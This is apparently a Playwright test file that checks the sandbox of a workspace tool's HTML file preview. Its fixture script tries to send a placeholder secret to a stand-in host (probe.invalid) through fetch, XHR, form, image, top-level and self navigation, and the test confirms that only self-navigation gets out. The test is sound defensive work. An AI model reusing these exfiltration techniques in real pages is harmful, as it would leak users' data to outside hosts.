import { writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { expect, test } from '@playwright/test';
import { pairBrowser, playgroundInfo } from './playground';
import { openNavigation } from './workspace-navigation';

/**
 * What a previewed file can and cannot do, proved by watching for the requests
 * rather than by reading the header back.
 *
 * Each attempt aims at its own address, so the one that gets out names itself.
 */
const hostile = `<!doctype html>
<html><body><h1>Report</h1><script>
  const secret = 'worktree-secret';
  fetch('https://probe.invalid/fetch?' + secret).catch(() => {});
  try {
    const request = new XMLHttpRequest();
    request.open('GET', 'https://probe.invalid/xhr?' + secret);
    request.send();
  } catch {}
  const form = document.createElement('form');
  form.method = 'GET';
  form.action = 'https://probe.invalid/form';
  document.body.append(form);
  try { form.submit(); } catch {}
  const image = new Image();
  image.src = 'https://probe.invalid/img?' + secret;
  document.body.append(image);
  try { window.top.location = 'https://probe.invalid/top?' + secret; } catch {}
  // The documented exception: a frame may send itself somewhere, and the
  // address carries whatever the script could see.
  setTimeout(() => { location.href = 'https://probe.invalid/self?' + secret; }, 400);
</script></body></html>`;

test('a previewed file cannot call out, post or move the page, and can still send itself away', async ({
  page,
}) => {
  const { worktreePath } = await playgroundInfo<{ worktreePath: string }>();
  const name = `hostile-${test.info().project.name}.html`;
  await writeFile(join(worktreePath, name), hostile);

  const attempted: string[] = [];
  await page.route('**://probe.invalid/**', async (route) => {
    attempted.push(new URL(route.request().url()).pathname);
    await route.abort();
  });

  await pairBrowser(page);
  await openNavigation(page);
  await page.getByRole('button', { name: /^review / }).click();
  const files = page.getByRole('tab', { name: 'Files', exact: true });
  if (!(await files.isVisible()))
    await page.getByRole('button', { name: 'Review', exact: true }).click();
  await files.click();
  await page.locator(`[role="treeitem"][data-item-path="${name}"]`).click();

  // The preview renders, and says plainly what it does not prevent.
  await expect(
    page.getByText('A script can still send what it sees out'),
  ).toBeVisible();
  const frame = page.frameLocator(`iframe[title="${name}"]`);
  await expect(frame.getByRole('heading', { name: 'Report' })).toBeVisible();

  // The one attempt that gets out is the frame sending itself away.
  await expect.poll(() => attempted).toContain('/self');
  expect(attempted).not.toContain('/fetch');
  expect(attempted).not.toContain('/xhr');
  expect(attempted).not.toContain('/form');
  expect(attempted).not.toContain('/img');
  expect(attempted).not.toContain('/top');
  // The surrounding page never moved: the frame took itself away, not us.
  expect(page.url()).not.toContain('probe.invalid');
});
